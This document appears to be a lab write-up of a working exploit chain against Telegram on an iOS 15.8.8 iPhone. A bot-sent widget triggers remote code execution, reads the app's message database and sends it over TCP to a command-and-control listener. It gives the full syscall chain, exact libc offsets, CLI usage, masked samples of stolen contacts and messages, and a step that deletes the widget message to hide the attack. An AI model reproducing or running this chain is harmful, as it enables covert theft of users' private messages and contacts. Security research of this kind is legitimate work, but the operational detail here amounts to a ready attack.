# iOS 6s — full session steal + C2 CLI

Date: 2026-11-05. Target: iPhone 6s, iOS 15.8.8, Telegram 13.2 (36535).

## Flow

`lab/ios_port/c2_full_steal.py` is the one-command C2/demo:

1. listens on TCP `0.0.0.0:4453`;
2. sends the widget (`device_widget_ios_full_db.html`) with the bot API
   `sendWidget` (`/beta/`);
3. the widget executes the #1827 RCE, maps a fixed 47 MB buffer at
   `0x120000000`, `open`s the Postbox DB, `read`s 47 MB, and `send`s it to the
   C2 over TCP;
4. the CLI saves the DB, prints size/sha256;
5. decodes the session: account (masked), contacts/chats (masked, from `t2`),
   recent messages with timestamps (masked, from `t7`);
6. deletes the widget message from the chat.

## Usage

```bash
cd <HOME>/ailocal/Telegram
# full flow (Telegram must be freshly launched; the widget thread stops after
# the exfil because of pthread_exit):
python3 lab/ios_port/c2_full_steal.py

# decode an already received DB:
python3 lab/ios_port/c2_full_steal.py --decode-only /tmp/opencode/ios_full_db
```

Defaults: old bot token read from `POC/mtproto_entity_probe/probe_mtproto.py`,
chat `<CHAT_ID>` (6s/17 account), port 4453, payload
`lab/ios_port/device_widget_ios_full_db.html`.

## Payload

`device_widget_ios_full_db.html` (8,840 B raw, 3,875 B zlib9) is the
terser-minified `ios_exfil_mmap_endgame.js` with `pure_funcs=[setres]` (the
debug markers are stripped). Chain: socket → dup2(40) → connect →
mmap(0x120000000, 47 MB, PROT_READ|WRITE, MAP_PRIVATE|ANON|FIXED) → open(DB) →
read(47 MB into the mapping) → send(40, 0x120000000, 47 MB) → pthread_exit.

iOS 15.8.8 deltas from libc `free`: open +0x296b394c, read +0x296b2d60,
socket +0x296b8d8c, connect +0x296b73f0, dup2 +0x296bc7d4, mmap +0x296b3dd0,
send -0x6b2c5bc, pthread_exit +0x4a21a474.

## Decoder output (sample)

```
[+] Account: G***o P***a  @g*********a  phone=3**********4
[+] Contacts/chats (masked):
    L****s i*                     @p*
    t**t                          @w***********t
    A*************t               @A*************t
    T******m B**a C**t p*         @t********t
    D********A s* G***p           @D*************p
[+] Recent messages (masked):
    11-05 21:51  L****s i*                | N*
    11-05 21:50  t**t                     | H*
    11-05 21:49  L****s i*                | @**********t c* s**?
```

The DB tables used: `t2` (users: first/last name, username, phone) and `t7`
(messages: peer id, timestamp in the key, text in the value).

## Notes

- The widget ends with `pthread_exit`; Telegram remains alive, but the widget
  thread stops. Relaunch Telegram before another run.
- The old `Uint8Array(48MB)` approach made the widget engine print
  "Widget stopped" (OOM). The fixed `mmap` buffer avoids the large JS
  allocation; the app does not crash.
- The widget message is deleted by the CLI at the end (`--no-delete` to keep
  it).
